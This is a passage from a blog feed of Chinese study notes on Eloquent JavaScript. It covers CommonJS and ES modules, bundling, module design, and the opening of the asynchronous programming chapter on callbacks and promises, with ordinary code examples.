class="string">"MMMM"</span>) <span class="keyword">return</span> months[date.getMonth()];</span><br><span class="line">    <span class="keyword">if</span> (tag == <span class="string">"D"</span>) <span class="keyword">return</span> date.getDate();</span><br><span class="line">    <span class="comment">// 获得的日子传递给ordinal函数可以获得类似1st,4th这样的形式</span></span><br><span class="line">    <span class="keyword">if</span> (tag == <span class="string">"Do"</span>) <span class="keyword">return</span> ordinal(date.getDate());</span><br><span class="line">    <span class="comment">// 获得的星期数刚好传递给days数组，因为英语第一天的星期日，也即是0索引，其他正常。</span></span><br><span class="line">    <span class="keyword">if</span> (tag == <span class="string">"dddd"</span>) <span class="keyword">return</span> days[date.getDay()];</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>ordinal</code>的接口是单个函数，而<code>date-names</code>输出一个包含多个东西的对象，<code>days</code>和<code>months</code>是名字数组。当对引入的接口创造绑定时解构是非常方便的方式。</p>
<p>模块将它的接口函数添加到<code>exports</code>来让依赖它的模块可以获取到它。我们可以这样使用模块。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;formatDate&#125; = <span class="built_in">require</span>(<span class="string">"./format-date"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(formatDate(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2017</span>, <span class="number">9</span>, <span class="number">13</span>), <span class="string">"dddd the Do"</span>));</span><br><span class="line"><span class="comment">// -&gt; Friday the 13th</span></span><br></pre></td></tr></table></figure>

<p>我们可以像这样定义<code>require</code>函数的最简形式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创造一个纯对象，不以Object.prototype为原型</span></span><br><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// name为引入的模块名</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 要加载的模块不在缓存中</span></span><br><span class="line">    <span class="keyword">if</span>(!(name <span class="keyword">in</span> <span class="built_in">require</span>.cache)) &#123;</span><br><span class="line">        <span class="comment">// 将文件内容以字符串格式返回</span></span><br><span class="line">        <span class="keyword">let</span> code = readFile(name);</span><br><span class="line">        <span class="comment">// 最终对外所见的对象，包含exports属性</span></span><br><span class="line">        <span class="keyword">let</span> <span class="built_in">module</span> = &#123;<span class="attr">exports</span>: &#123;&#125;&#125;;</span><br><span class="line">        <span class="comment">// 置于cache中</span></span><br><span class="line">        <span class="built_in">require</span>.cache[name] = <span class="built_in">module</span>;</span><br><span class="line">        <span class="comment">// 包装器函数接收三个参数，执行函数体中字符串代码</span></span><br><span class="line">        <span class="keyword">let</span> wrapper = <span class="built_in">Function</span>(<span class="string">"require, exports, module"</span>, code);</span><br><span class="line">        wrapper(<span class="built_in">require</span>, <span class="built_in">module</span>.exports, <span class="built_in">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在缓存中直接返回对应属性对象的exports属性</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">require</span>.cache[name].exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这段代码种，<code>readFile</code>是一个捏造的读取文件并将其内容作为字符串返回的函数。标准JS没有提供这样的功能，但是不同的JS环境，如浏览器和Node，提供了他们自己的获取文件的方式。这个例子仅仅是假装<code>readFile</code>是存在的。</p>
<p>为了避免多次加载同样的模块，<code>require</code>保存一个已经加载的模块的商店（缓存）。当被调用的时候，首先检查是否请求的模块已经被加载了，如果没有的话才加载它。这涉及到读取模块的代码，将其包装在一个函数中，并且调用它。</p>
<p>我们之前看到的<code>ordinal</code>包的接口不是一个对象而是一个函数。CommonJS的一个怪癖就是即便模块系统可以创建一个空的接口对象（绑定到<code>exports</code>），你也可以通过重写<code>module.exports</code>来用任何值代替它。许多模块输出单个值而不是一个接口对象都是这么做的。</p>
<p>通过定义<code>require</code>，<code>exports</code>和<code>module</code>作为生成的包装器函数的参数（并且调用她的时候传递适当的参数），加载器确保在模块作用域中这些绑定可以获取到。</p>
<p><code>require</code>的参数字符串在不同的系统中解释为实际的文件名或者web地址方式是不同的。当开始于”./“或者”../“，它通常被解释为相对于当前模块文件名的。所以”./format-date”将会是相同文件夹下的叫做”format-date.js”的文件。</p>
<p>当名字不是相对的时，Node.js会通过这个名字找到一个被安装的包。在这章的例子代码中，我们将会把这样的名字作为NPM包解释。我们将在20章涉及更多安装和使用NPM模块的细节。</p>
<p>现在，代替写我们自己的INI文件解析器，我们可以从NPM中获取一个。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;parse&#125; = <span class="built_in">require</span>(<span class="string">"ini"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(parse(<span class="string">"x = 10\ny = 20"</span>));</span><br><span class="line"><span class="comment">// → &#123;x: "10", y: "20"&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ECMASCRIPT模块"><a href="#ECMASCRIPT模块" class="headerlink" title="ECMASCRIPT模块"></a>ECMASCRIPT模块</h2><p>CommonJS模块工作的非常好，并且组合NPM，允许JS社区开始大规模共享代码。</p>
<p>但是它们保留了一些管道胶带hack。记号有点尴尬，如你对<code>exports</code>添加的东西在局部作用域无法获取。并且因为<code>require</code>是一个接受任何类型参数的普通函数调用，不只是字符串字面量，在不运行代码的时候很难确定模块的依赖。</p>
<p>这就是JS标准在2015年引入了内建的不同的模块系统的原因。它通常被叫做ES模块，ES代表ECMAScript。主要的依赖和接口的概念保持一致，但是细节有所区别。首先，标记已经集成到语言本身了。代替通过调用函数获取依赖，你可以使用特殊的<code>import</code>关键字。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ordinal <span class="keyword">from</span> <span class="string">"ordinal"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;days, months&#125; <span class="keyword">from</span> <span class="string">"date-names"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">formatDate</span>(<span class="params">date, name</span>) </span>&#123; <span class="comment">/* ... */</span>&#125;</span><br></pre></td></tr></table></figure>

<p>相似地，<code>export</code>关键字被用于输出东西。它可以在函数，类或者绑定定义（let，var或者const）前出现。</p>
<p>一个ES模块的接口不是单个值而是一组命名的绑定。前面的模块将<code>formatDate</code>绑定到一个函数。当你从另外的模块引入时，你引入了绑定，而不是只，也意味着一个输出模块可能在任何时候改变绑定的值，并且引入它的模块能够看见它的新值。</p>
<p>当有一个叫做<code>default</code>的绑定时，他被当作模块默认的主要的输出值。如果你引入一个类似例子中的<code>ordinal</code>模块，在绑定名字周围没有括号，你将获得一个默认绑定。这样的模块仍然可以输出其他名字的绑定。</p>
<p>为了创造一个默认输出，你在表达式前书写<code>export default</code>，一个函数声明或者一个类声明。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> [<span class="string">"Winter"</span>, <span class="string">"Spring"</span>, <span class="string">"Summer"</span>, <span class="string">"Autumn"</span>];</span><br></pre></td></tr></table></figure>
<p>可使用<code>as</code>关键字重命名引入的绑定：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;days <span class="keyword">as</span> dayNames&#125; <span class="keyword">from</span> <span class="string">"date-names"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(dayNames.length);</span><br><span class="line"><span class="comment">// -&gt; 7</span></span><br></pre></td></tr></table></figure>

<p>另一个重要的区别是ES模块的import发生在模块脚本运行之前。那意味着<code>import</code>声明不会出现在函数或者块中，并且依赖的名字必须是引用的字符串，而不是任意表达式。</p>
<p>在写作的时候，JS社区正处在接纳这种模块风格的过程中。但这是一个缓慢的过程。在格式被指定之后要花费几年的时间让浏览器和Node开始支持它。即使他们大多都正在支持，但是这种支持仍然存在问题，并且对这样的模块应该怎样通过NPM分发的讨论仍在进行。</p>
<p>许多使用ES模块写的项目在发行时自动转换为其他格式。我们正处在两种不同的模块系统肩并肩的使用的过渡时期，能够在任何一种模块系统下读取和写代码是很有用的。</p>
<h2 id="构建和打包"><a href="#构建和打包" class="headerlink" title="构建和打包"></a>构建和打包</h2><p>事实上，许多JS项目技术上甚至不是用JS写的。例如第八章提及的类型检查扩展。被广泛使用。人们也经常开始使用对语言的计划的扩展，即便是在这些扩展还没有添加到实际运行JS的平台。</p>
<p>为了使这个成为可能，它们编译它们的代码，将他们选择的JS方言解释为平实的古老的JS，或者甚至是过去版本的JS，以让旧的浏览器可以运行。</p>
<p>在一个web页面包含200个不同文件的模块程序会产生它本身的问题。如果通过网络获取单个文件需要花费50毫秒，那么加载整个程序要花费10秒时间，或者如果可以同时加载几个文件这个时间会减半。那确实有点浪费时间。因为获取一个单个大文件要比获取许多不同的小文件更快，web开发者已经开始使用工具，这些工具在它们将项目发行到web之前，将它们的程序（费力的分割的模块）卷成一个单个大文件。这样的工具叫做打包器。</p>
<p>我们可以更进一步。除了文件的数量，文件的大小也决定了它们可以在网络上以多块的速度传输。因此，JS社区发明了缩小器（minifier）。这些工具接收一个JS程序，并通过移除空白和注释，重命名绑定和用等价占据更少空间的代码替换成块的代码来使得JS程序更小。</p>
<p>所以对于你在NPM包中发现的代码或者运行在网页上的代码，已经经历过多个转换阶段是很常见的。从现代JS到历史的JS，从ES模块格式到CommonJS，打包，压缩…我们将不会在本书中涉及过多细节因为这些工具特别枯燥并且日新月异。仅仅意识到你运行的JS代码通常不是它所写时候的代码了。</p>
<h2 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h2><p>程序的结构化式编程的一个更微妙的方面。任何重要的功能可以用多种方式去建模。</p>
<p>好的程序设计是主观的，涉及到折衷以及口味。学习定义良好结构的设计的价值的最佳方式就是读或者致力于一些程序来观察什么在工作，什么不工作。不要一位痛苦的混乱就本该是这样。你可以通过多加思索来改善结构。</p>
<p>模块设计的一个方面就是简单易用。如果你正在设计要被很多人使用的东西，或者仅仅供自己使用，三个月之后你不记得自己所写的细节时，如果你的接口简单并且可预测那么是很有帮助的。</p>
<p>这意味着遵循存在的规范。一个好的例子就是ini包。这个模块通过提供<code>parse</code>和<code>stringify</code>(写入INI文件)函数，并且像JSON一样，在字符串和普通对象之间转换。所以接口小而熟悉，并且在和它工作一次之后就很容易记得如何使用它。</p>
<p>即使没有标准函数或广泛被使用的包供你模仿，你也可以通过使用简单的数据结构并且只做单一职能的东西来是你的模块可预测。例如许多INI文件解析模块提供一个函数从硬盘中直接读取这样的文件并且解析它。这使得在浏览器中不能够使用这样的模块，因为浏览器不能做直接的文件系统获取，并且增加了复杂性，如果使用一些文件读取函数来组合这些模块问题可能会很好的解决。</p>
<p>这指出了另一个模块设计的有益的方面，可以很容易与其他代码协同工作。与执行带有副作用的复杂行为的较大模块相比，专注计算值的程序更具有普适性。在文件内容来自其他源的时候，坚持从硬盘读取文件的INI文件阅读器是没用的。</p>
<p>相关地，有状态的对象有时有用，甚至是必要的，但是如果可以用函数完成某些事情，就用函数吧。NPM上的一些INI文件阅读器提供一个需要你首先创建对象的接口，然后将文件装载进你的对象中，并最终使用专门的方法去获取结果。这种类型的东西在面向对象编程中很常见，并且很糟糕。代替做单次函数调用，你不得不按照惯例的使你的对象在多种状态间游走。因为数据包装在专用的对象类型，所有的和他交互的代码必须知道那个类型，从而创造了不必要的相互依赖。</p>
<p>通常定义新的数据结构是不可避免地，因为只有一些基础的数据结构由语言标准提供，并且许多类型的数据要比一个数组或一个map复杂。但是当数组够用的时候，就使用数组。</p>
<p>一个稍微复杂的数据结构就是第七章中的图。没有一种显而易见的在JS中表示图的方式。在哪一章，我们使用了对象的属性来保存字符串数组，从那个结点可以到达的结点。</p>
<p>在NPM上有几种不同的寻路包，但是它们当中没有使用这种图格式的。它们通常允许图的边拥有一个权重，也就是和它关联的代价或者距离。在我们的表示中是不可能的。</p>
<p>例如，有一个<code>dijkstrajs</code>包。一个众所周知的寻路算法，非常类似于我们的<code>findRoute</code>函数，被叫做<em>Dijkstra’s algorithm</em>，以Edsger Dijkstra命名，也是首位写下这个算法的人。<em>js</em>后缀经常被加到包名中以表明它们是用JS书写的。这个<code>dijkstrajs</code>包使用一个类似于我们图格式的图格式，但是没有使用数组，它使用了对象，对象的属性值是数字也就是边的权重。</p>
<p>所以如果我们想要使用那个包，我们将确保我们的图存储在它期望的格式。由于我们的简化模型对待每一条路都是相同的代价所以所有边都获得相同的权重。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;find_path&#125; = <span class="built_in">require</span>(<span class="string">"dijkstrajs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> graph = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> node <span class="keyword">of</span> <span class="built_in">Object</span>.keys(roadGraph)) &#123;</span><br><span class="line">    <span class="keyword">let</span> edges = graph[node] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> dest <span class="keyword">of</span> roadGraph[node]) &#123;</span><br><span class="line">        edges[dest] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(find_path(graph, <span class="string">"Post Office"</span>, <span class="string">"Cabin"</span>));</span><br><span class="line"><span class="comment">// -&gt; ["Post Office", "Alice's House", "Cabin"]</span></span><br></pre></td></tr></table></figure>

<p>这可能是个创作的屏障，当多个包用不同的数据结构去描述相似的事物，将他们组合起来是困难的。因此，如果你想要为面向可组合性设计，看看别人是用什么数据结构，如果可能的话，用它们的例子。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>模块通过将代码分离为具有清晰接口和依赖的小块为较大的程序提供结构性。接口时模块对外可见的一部分，依赖是它所使用的其他模块。</p>
<p>因为JS历史上没有提供一个模块系统，CommonJS是在它上面构建的模块系统。然后在某个时刻确实有了内建的模块系统，不那么容易和CommonJS系统和谐共处。</p>
<p>一个包就是一块独立的可以自由分发的代码。NPM是JS包仓库。你可以从它下载各种有用的（无用的）包。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="一个模块化的机器人"><a href="#一个模块化的机器人" class="headerlink" title="一个模块化的机器人"></a>一个模块化的机器人</h3><p>这些是第七章项目创造的绑定：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">roads</span><br><span class="line">buildGraph</span><br><span class="line">roadGraph</span><br><span class="line">VillageState</span><br><span class="line">runRobot</span><br><span class="line">randomPick</span><br><span class="line">randomRobot</span><br><span class="line">mailRoute</span><br><span class="line">routeRobot</span><br><span class="line">findRoute</span><br><span class="line">goalOrientedRobot</span><br></pre></td></tr></table></figure>

<p>如果你想要将这个项目写作模块化的程序，你需要创建什么模块？哪一个模块要依赖其他的模块，它们的接口又应该是怎样的？</p>
<p>哪部分可能在NPM获得？你喜欢使用NPM包还是自己写一个？</p>
]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ11</title>
    <url>/2019/01/09/EJ11/</url>
    <content><![CDATA[<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><p>计算机的中心，也就是执行组成我们程序独立的步的部分叫做处理器。我们到目前为止所见的程序将会使处理器一直运转知道它们完成工作。修改数字的循环以多快的速度执行极度依赖处理器的速度。</p>
<p>但是许多程序与处理器外的东西交互。例如，它们可能通过计算机网络通讯或者从硬盘上请求数据，这些操作远比从内存中获取慢得多。</p>
<p>当这样的事情发生时，让处理器停转是一件遗憾的事情，存在可以同时做的一些其他的工作。在某种程度上，这是通过操作系统处理的，操作系统将会在多个运行程序间切换处理器。但是当我们想要让单个程序在等待网络请求的同时能够继续运行操作系统就帮不上忙了。</p>
<a id="more"></a>

<h2 id="异步性"><a href="#异步性" class="headerlink" title="异步性"></a>异步性</h2><p>在同步编程模型中，一次只能发生一件事。当你调用一个长时运行的函数时，只有当行为结束并且返回结果时他才会返回。当行为在进行时这阻塞了你的程序。</p>
<p>一个异步模型允许多个事情同时发生。当你开始一个行为的时候，你的程序继续运行。当行为结束时，程序被通知然后获取结果（例如，从硬盘读取数据）。</p>
<p>我们可以用一个小例子比较同步编程和异步编程：一个从网络获取两个资源的程序，随后将结果进行整合。</p>
<p>在同步环境下，请求函数只在它完成工作后才可返回，最简单的做这个人物的方式是一个挨着另一个的发起请求。缺点在于第二个请求只有在第一个结束之后才可以发起。总时间至少是两次响应时间的和。</p>
<p>这个问题的解，在一个同步系统中，是开一个额外的控制线程。一个线程（thread）是另一个运行的程序，通过操作系统，它的运行可能与其他程序交错进行，因为大多数现代计算机包含多个处理器，多个线程就可以同时在不同处理器运行。第二个线程可以发起第二个请求，然后两个线程等待响应，随后它们重新同步来组合结果。</p>
<p>在下面的图中，粗线代表程序正常运行的时间，细线代表等待网络响应的时间。在同步模型中，花费在网络上的时间是给定控制线程的时间轴的一部分。在异步模型中，开始一个网络行为概念上导致时间轴上一个分叉。开启行为的程序继续运行，并且行为和它一同进行，当行为完成时通知程序。</p>


<p>另一种描述区别的方式是，完成行为的等待在同步模型中是隐式的，而在异步模式中是显式的在我们控制下的。</p>
<p>异步使得表达不适合直线模型的控制更简单，但是也能让表达直线程序更加尴尬。我们随后将会看一些解决这种尴尬性的方式。</p>
<p>两个重要的JS编程平台，浏览器和Node.js，对于可能花费一些时间的操作采取异步策略，而不是依赖于线程。因为线程编程是出了名的困难（当一次做许多事情时理解一个程序做什么很困难），所以这通常被认为是个好事情。</p>
<h2 id="乌鸦科技"><a href="#乌鸦科技" class="headerlink" title="乌鸦科技"></a>乌鸦科技</h2><p>大多数人知道乌鸦是非常小的鸟。它们可以使用工具，提前计划，记住事情，甚至在他们之间交流这些事情。</p>
<p>大多数人不知道的是它们能够做许多我们不知道的事情。我曾经被一个鸦科专家告诉乌鸦科技离人类科技不远，它们正在努力追赶。</p>
<p>例如，许多乌鸦文化有能力构建计算设备。这些不是像人类的计算设备的电子器件，而是通过小昆虫的行动来操作，一个和白蚁紧密相关的物种，已经与乌鸦建立了一种共生关系。鸟给它们提供食物，作为回报，昆虫构建并且操作它们的复杂的种群，在他们体内的生物的帮助下，进行计算。</p>
<p>这些种群通常坐落于大的可长期居住的巢穴。鸟和昆虫一起工作，在鸟巢的树枝之间去建立一个球状粘土结构的网络，昆虫在里面生活和工作。</p>
<p>为了和其他设备通信，这些机器使用光信号。乌鸦将一些反光材料嵌入到特殊的通信杆中，昆虫将这些材料用于反射另一个巢穴的光线，将数据编码为一个快速闪光序列。这意味着只有拥有完整视觉连接的巢穴才可以通信。</p>
<p>我们的鸦科专家绘制了罗纳河岸上的amby村庄的乌鸦巢穴网络图，这张图展示了巢穴和他们之间的连接。</p>


<p>在这个例子中，乌鸦计算机可以运行JS。在这一章中，我们将为他们写一些基本的网络功能。</p>
<h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p>一个异步编程的方法是让执行缓慢操作的函数接受一个额外的参数，一个回调函数。该操作被启动，当完成时，回调函数被用这个结果进行调用。</p>
<p>作为一个例子，<code>setTimeout</code>函数等待给定的毫秒数（1秒是1000毫秒）然后调用一个函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">"Tick"</span>), <span class="number">500</span>);</span><br></pre></td></tr></table></figure>

<p>等待通常不是一种非常重要的工作类型，但是当更新动画时或者检查是否有某件事情比预期时间花费了更长时间是是很有用的。</p>
<p>在一行使用回调执行多个异步行为意味着你必须持续传递新的函数，在行为结束后处理计算过程的延续。</p>
<p>大多数的乌鸦巢穴计算机有一个持久存储数据的电灯泡，在这个灯泡里，信息被蚀刻到细枝上，以便之后可以检索到，蚀刻或者查找数据花费一些时间，所以持久存储的接口是异步的并且使用回调函数。</p>
<p>存储灯泡以JSON编码数据存储。一个乌鸦可能根据名字”food caches”来存储关于它隐藏食物的信息，可能是一个名字数组指向其他位置的数据，描述实际的贮藏地。为了在Big Oak的存储灯泡中查找一个食物贮藏地，一个乌鸦会运行这样的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;bigOak&#125; <span class="keyword">from</span> <span class="string">"./crow-tech"</span>;</span><br><span class="line"><span class="comment">// bigOak由附录可知为一个node实例，包含storage对象信息，从中读取的food caches为一个数组</span></span><br><span class="line">bigOak.readStorage(<span class="string">"food caches"</span>, caches =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> firstCache = caches[<span class="number">0</span>];</span><br><span class="line">    bigOak.readStorage(firstCache, info =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(info);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这种风格的编程是可行的，但是随着每一次异步行为缩进都会增加。如果做更复杂的如同时运行多个行为，可能有点不雅。</p>
<p>乌鸦巢穴计算机用请求-响应对进行通讯。那意味着一个巢穴向另一个巢穴发送消息，另一个巢穴再回复消息，确认收到并且可能包含对所问问题的回复。</p>
<p>每一个消息用一个类型来打标签，决定了它如何被处理。我们的代码可以为特定的请求类型定义处理程序，并且当这样的请求进来的时候，处理程序被调用产生一个回应。</p>
<p>被”./crow-tech”模块输出的接口提供基于回调的通信函数。巢穴有一个<code>send</code>方法来发送一个请求。它接受目标巢穴的名字，请求的类型以及请求的内容作为前面三个参数，还接受最后一个参数，它是一个函数并在响应回来的时候调用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 作为node实例的bigOak有send方法，接收目标节点，消息类型，消息内容和一个回调函数用于接收方处理完毕并发回响应时调用</span></span><br><span class="line">bigOak.send(<span class="string">"Cow Pasture"</span>, <span class="string">"note"</span>, <span class="string">"Let's caw loudly at 7PM"</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">"Note delivered."</span>));</span><br></pre></td></tr></table></figure>

<p>但是为了使得巢穴可以接受这种请求，我们首先必须定义名为<code>note</code>的请求类型。处理这个请求的代码要在所有可以接受这种类型的消息的巢穴上都能运行。我们将假设乌鸦到处飞然后在所有巢穴安装我们的处理程序代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 网络实例上的defineRequestType方法，在network实例对象的types增加一个键值对，值为handler</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineRequestType&#125; <span class="keyword">from</span> <span class="string">"./crow-tech"</span></span><br><span class="line"><span class="comment">// 定义"note"类型，并表明接收方收到该类型的处理函数，与上面的send一脉相承，在附录的send实现中，我们要在一定概率下，在接收方调用handler函数，在这里就是首先打印xxx收到了xxx内容，然后调用done函数，而done函数就是在10ms后调用send提供的callback函数（如果有error作为第一个参数传给callback），有点点绕。。。需要结合附录源码理解</span></span><br><span class="line">defineRequestType(<span class="string">"note"</span>, (nest, content, source, done) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;nest.name&#125;</span> received note: <span class="subst">$&#123;content&#125;</span>`</span>);</span><br><span class="line">    done();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>defineRequestType</code>函数定义一种新类型的请求。例子添加了对”note”请求的支持，仅仅是为给定巢穴发送一个音符。我们的实现调用<code>console.log</code>如此我们可以确认请求到达了。巢穴有一个name属性保存着他们的名字。</p>
<p>在某种程度上，异步是可以传染的。任何调用异步函数的函数本身必须是异步的，使用一个回调或者一个相似的机制来传递结果。与简单地返回值相比，调用回调更加复杂，所以需要以这种方式大规模构造程序并不好。</p>
<h2 id="Promises"><a href="#Promises" class="headerlink" title="Promises"></a>Promises</h2><p>和抽象的概念相处要比可以被值表示的概念更容易。就异步行为而言，代替为将来某一刻要调用的函数做安排，你可以返回一个代表这个将来事件的对象。</p>
<p>这就是标准中<code>Promise</code>类的用途。一个<em>promise</em>就是一个异步操作，可能在某个时刻完成并产生一个值。当这个值可以获取时能够通知任何对此感兴趣的人。</p>
<p>最简单的创建promise的方式就是调用<code>Promise.resolve</code>。这个函数确保你给的值被包装在一个promise中。如果它已经是一个promise了，就简单的返回，否则你得到一个新的promise，并立刻以你的值返回。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fifteen = <span class="built_in">Promise</span>.resolve(<span class="number">15</span>);</span><br><span class="line">fifteen.then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Got <span class="subst">$&#123;value&#125;</span>`</span>));</span><br><span class="line"><span class="comment">// → Got 15</span></span><br></pre></td></tr></table></figure>

<p>为了得到promise的结果，你可以使用它的<code>then</code>方法。这注册了一个回调函数当promise解析成功并且产生一个值时调用。你可以为单个promise添加多个回调函数，即使你在promise已经被解决（resolved, finished）后添加他们，它们也会被调用。</p>
<p>但是那并不是<code>then</code>方法的全部功能。他返回另一个promise，这个promise解析为处理程序返回的值，或者如果返回一个promise，则等待这个promise，然后解析为其结果。</p>
<p>将promise想象成一个将值移动到一个异步现实的设备是很有用的。一个正常值简单地在那。一个promise值就是可能已经在那或者可能在将来某个时间才会出现的值。根据promise定义的计算作用在这些包装值上，并且在值可用时异步执行。</p>
<p>为了创建一个<code>promise</code>，你可以用<code>Promise</code>构造器。它有一个奇怪的接口，构造器接受一个函数作为参数，然后该函数被调用，传递给它一个函数去解析promise。它以这种方式工作，而不是用resolve方法，如此一来只有创建promise的代码才能解析它。</p>
<p>这就是为<code>readStorage</code>函数创建的基于promise的接口。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将读取storage的异步方法封装（实现通过直接读取节点的storage对象的name属性获得，并通过setTimeout伪装成异步）。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">storage</span>(<span class="params">nest, name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        nest.readStorage(name, result =&gt; resolve(result));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">storage(bigOak, <span class="string">"enemies"</span>);</span><br><span class="line">    .then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">"Got"</span>, value));</span><br></pre></td></tr></table></figure>

<p>这个异步函数返回一个有意义的值。这是promise主要的优点，它们简化了异步函数的使用。代替不得不传进去回调，基于promise的函数看上去像普通的函数：它们接收输入作为参数并且返回输出。唯一的区别就是输出还不可用。</p>
<h2 id="失败"><a href="#失败" class="headerlink" title="失败"></a>失败</h2><p>常规的JS计算可以因抛出一个异常而失败。异步计算经常需要这样的东西。网络请求可能失败，或者异步计算的某部分代码会抛出异常。</p>
<p>对于回调风格的异步编程最紧迫的问题就是确保失败正确报告给回调是非常困难的。</p>
<p>一个广泛使用的规范就是传递给回调的第一个参数被用于表明行为失败，第二个包含当行为成功时产生的值。这样的回调函数必须检查是否产生了异常并确保它们调用函数导致的抛出的异常，被捕获并传递给正确的函数。</p>
<p>promise使得这个很容易。它们要么可以被resolved（动作成功结束）或者rejecteds（失败了）。resolve处理程序（用then注册）只在动作成功才调用，并且rejections自动传播到由then返回的新的promise。当一个处理程序抛出异常时，这自动导致由then调用产生的promise被rejected。所以如果任何在异步动作链中的元素失败，整个链的输出都被标记为rejected，并且在失败的点的后面没有成功处理程序被调用。</p>
<p>就像resolve一个promise提供一个值一样，reject也会提供一个值，通常叫做rejection的reason。当一个处理函数的异常导致了rejection，异常值被用作reason。相似地，当一个处理程序返回一个rejected的promise，这个rejection流动到下一个promise。有一个<code>Promise.reject</code>函数立刻创建一个全新的rejected的promise。</p>
<p>为了明确处理rejections，promise有一个<code>catch</code>方法注册一个处理程序用于在promise被reject时调用，与<code>then</code>处理程序如何处理正常的resolve类似。在返回新的promise方面也非常类似<code>then</code>方法。如果<code>catch</code>处理程序抛出错误，那么新的promise也是rejected的。</p>
<p>作为一种简略的表达形式，<code>then</code>也接受一个rejection处理程序作为它的第二个参数，所以可以在单个方法调用中安装两种类型的处理程序。</p>
<p>传递给<code>Promise</code>构造器的函数接收第二个参数，挨着resolve函数，可被用于reject新的promise。</p>
<p>由then和catch调用产生的promise值链可以被看作是一个流水线，通过这个流水线，异步值或者失败移动。因为这样的链通过注册处理程序创建，每一个链接都关联一个成功处理程序或者一个rejection处理程序或者二者皆有，不匹配输出（成功或者失败）类型的处理程序被忽略。但是那些类型匹配的被调用，并且他们的输出决定了即将到来的值的类型，如果返回一个非promise值就成功，抛出异常则reject，如果返回promise则取决于promise返回的结果。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_, reject</span>) =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Fail"</span>)))</span><br><span class="line">  .then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">"Handler 1"</span>))</span><br><span class="line">  .catch(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Caught failure "</span> + reason);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"nothing"</span>;</span><br><span class="line">  &#125;)</span><br><span 